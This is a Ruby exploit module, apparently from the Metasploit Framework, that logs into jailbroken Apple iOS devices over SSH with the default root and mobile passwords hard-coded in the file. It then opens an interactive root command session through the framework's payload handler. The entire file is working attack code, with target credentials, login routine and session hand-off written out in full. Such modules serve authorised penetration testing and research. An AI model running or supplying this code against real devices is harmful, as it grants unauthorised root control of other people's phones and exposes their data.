require 'net/ssh'
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apple iOS Default SSH Password Vulnerability',
        'Description' => %q{
          This module exploits the default credentials of Apple iOS when it
          has been jailbroken and the passwords for the 'root' and 'mobile'
          users have not been changed.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'hdm'
        ],
        'References' => [
          ['OSVDB', '61284']
        ],
        'DefaultOptions' => {
          'EXITFUNC' => 'thread'
        },
        'Payload' => {
          'Compat' => {
            'PayloadType' => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [
          ['Apple iOS', { 'accounts' => [ [ 'root', 'alpine' ], [ 'mobile', 'dottie' ]] } ],
        ],
        'Privileged' => true,
        'DisclosureDate' => '2007-07-02',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def post_auth?
    true
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def do_login(user, pass)
    opts = ssh_client_defaults.merge({
      auth_methods: ['password', 'keyboard-interactive'],
      port: rport,
      password: pass
    })

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh = Net::SSH.start(rhost, user, opts)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh
      conn = Net::SSH::CommandStream.new(ssh)
      ssh = nil
      return conn
    end

    return nil
  end

  def exploit
    target['accounts'].each do |info|
      user, pass = info
      print_status("#{rhost}:#{rport} - Attempt to login as '#{user}' with password '#{pass}'")
      conn = do_login(user, pass)
      next unless conn

      print_good("#{rhost}:#{rport} - Login Successful ('#{user}:#{pass})")
      handler(conn.lsock)
      break
    end
  end
end
